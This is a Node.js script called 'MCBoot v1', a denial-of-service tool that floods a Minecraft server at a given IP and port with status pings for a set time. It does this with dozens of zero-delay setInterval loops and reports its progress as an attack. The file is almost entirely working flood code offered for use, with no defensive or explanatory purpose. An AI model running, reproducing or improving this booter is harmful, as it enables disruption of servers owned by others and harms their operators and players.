
// REQUIREMENTS

const http = require('http');
const net = require('net');
const url = require('url');
const fs = require('fs');

const execSync = require('child_process').execSync;
const { argv } = require('process');
const { execFileSync } = require('child_process');
const { exec } = require("child_process");

var host = `${argv[2]}`;
var ipaddress = host;
var port = `${argv[3]}`;
var time = `${argv[4]}`;
var ipport = port;
try {
    var colors = require('colors');
    var pinger = require('minecraft-ping');
    var setTitle = require('console-title');
    var ShutdownHook = require('shutdown-hook');
} catch (err) {
    console.log('Bitte Warte Kurz...');
    execSync('npm install colors');
    execSync('npm install minecraft-ping');
    execSync('npm install console-title');
    execSync('npm install shutdown-hook');
    console.log('Done.');
    process.exit();
};
if (!process.argv[4]) {
    console.log("Syntax: IP PORT TIME")
    process.exit();
};

var sended = 0;
var error = 0;
let shutdownHook = new ShutdownHook()
console.clear()
console.log("Attack Started".cyan)
console.log("IP: ".green + host.rainbow)
console.log("Port: ".green + port.rainbow)
setTitle("MCBoot v1")
function attack() {
    pinger.ping({host: ipaddress, port: ipport}, function (err, response) {
        stopAfter()
        if(response) {
            sended++
        }else {
            error++
        }
    });
}

shutdownHook.register()
shutdownHook.on('ShutdownEnded', (e) => stop())

function stopAfter() {
    if (sended > 1000000) {
        stop()
    }
}

function stop() {
    var iksde = "" + sended
    var iksde2 = "" + error
    console.clear()
    console.log("Thanks for using MCBoot v1".rainbow)
    console.log("Connected: ".rainbow + iksde.rainbow)
    console.log("Failed: ".rainbow + iksde2.rainbow)
    process.exit();
}

function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}
setInterval(function () {
    attack()
}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);

setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setInterval(function () {
    attack()

}, 0);
setTimeout(stop, time * 1000, 'funky monkey')